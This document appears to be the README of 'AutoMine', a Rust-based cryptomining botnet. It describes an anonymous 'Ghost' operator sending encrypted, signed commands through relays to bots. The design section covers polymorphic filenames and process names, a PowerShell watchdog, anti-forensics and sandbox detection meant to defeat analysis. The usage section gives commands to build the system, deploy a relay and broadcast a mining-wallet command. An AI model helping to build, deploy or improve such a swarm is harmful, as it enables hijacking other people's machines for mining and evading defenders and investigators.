# AutoMine Network: Ghost-Relay-Swarm Architecture

> **STATUS**: ACTIVE
> **VERSION**: 2.0 (Rust Native)
> **SECURITY**: MILITARY-GRADE (E2EE + Ed25519)

## 1. System Overview

AutoMine is a next-generation, decentralized cryptocurrency mining swarm designed for maximum resilience, stealth, and security. Unlike traditional C2 architectures, it utilizes a **Ghost-Relay-Swarm** topology that eliminates single points of failure and anonymizes the operator.

## 2. Architecture

### 👻 The Ghost (Master)
- **Role**: Transient Command Authority.
- **Behavior**: The "Ghost" comes online only to inject signed commands into the network and immediately vanishes.
- **Capabilities**:
    -   Generates Cryptographic Identity (Ed25519).
    -   Encrypts commands (ChaCha20-Poly1305).
    -   Injects payloads via any public Relay.

### 📡 The Relay (Rendezvous)
- **Role**: Blind Signaling Node.
- **Behavior**: Stateless, public-facing server that facilitates peer discovery.
- **Privacy**: **Zero-Knowledge**. The Relay sees only encrypted binary blobs. It cannot inspect, modify, or forge commands.
- **Anti-Mapping**: Implements "Peer Blinding" (returns random subsets of peers) to prevent network mapping.

### 🐝 The Swarm (Bot)
- **Role**: Polymorphic Execution Unit.
- **Behavior**: Self-healing, resilient mining worker.
- **Connectivity**: Maintains **Active Heartbeats** (30s interval) to punch through NAT/Firewalls.
- **Logic**:
    -   **Polymorphic identity**: Randomizes filenames and process names on every install.
    -   **Watchdog**: `sys_monitor.ps1` ensures the miner process is always running.
    -   **Configuration**: Hot-reloadable via signed network commands.

---

## 3. Security Specifications

The system implements a "Zero-Trust" security model.

### 🔐 End-to-End Encryption (E2EE)
All command data is encrypted **client-side** by the Master before transmission.
-   **Algorithm**: IETF ChaCha20-Poly1305 (AEAD).
-   **Key**: Shared "Swarm Key" (32-byte).
-   **Benefit**: Relays, ISPs, and Network Sniffers see only opaque high-entropy noise.

### 🛡️ High Authentication
-   **Signatures**: Ed25519 (Elliptic Curve).
-   **Integrity**: Every packet must be signed by the Master's Private Key.
-   **Access Control**: Only the holder of the Private Key can issue commands.

### 🛑 Attack Mitigation
-   **Anti-Replay**: Bots track `Nonce` and `Timestamp` (60s window). Old or re-sent packets are strictly rejected.
-   **Anti-Forensics**: Sensitive logic resides in memory or trusted system directories.
-   **Anti-Analysis**: Sandbox detection (CPU/RAM/MAC checks) prevents execution in analysis environments.

---

## 4. Technical Stack

-   **Language**: Rust (Safe, Fast, Native).
-   **Async Runtime**: Tokio.
-   **Protocol**: WebSockets (WSS).
-   **Cryptography**: `ed25519-dalek`, `chacha20poly1305`, `rand`.
-   **Serialization**: Serde JSON.

## 5. Usage

### Build
```bash
cargo build --release --workspace
```

### Deploy Relay
```bash
./target/release/relay 0.0.0.0:8080
```

### Operator (Ghost)
```bash
# generate key
./target/release/master keygen

# inject command
./target/release/master broadcast --relay "ws://1.2.3.4:8080" --cmd "wallet:47ekr..."
```
